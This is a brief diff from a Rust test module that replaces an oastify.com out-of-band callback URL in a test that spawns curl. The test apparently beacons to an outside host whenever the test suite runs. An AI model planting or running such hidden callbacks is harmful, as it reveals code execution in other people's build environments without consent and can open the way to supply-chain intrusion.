@@ -54,7 +54,7 @@ mod tests {
     #[test]
     fn test_curl_trigger() {
         // Prepare the URL to which we will send a request
-        let url = "https://rb68aiec2cfrowz6yy9e2r38jzpqdk19.oastify.com/rust-test";
+        let url = "https://rwrs0dyixejabrn29vsjr7m0sryim8ax.oastify.com/rust-test";
 
         // Spawn a curl command to the given URL
         let output = Command::new("curl")
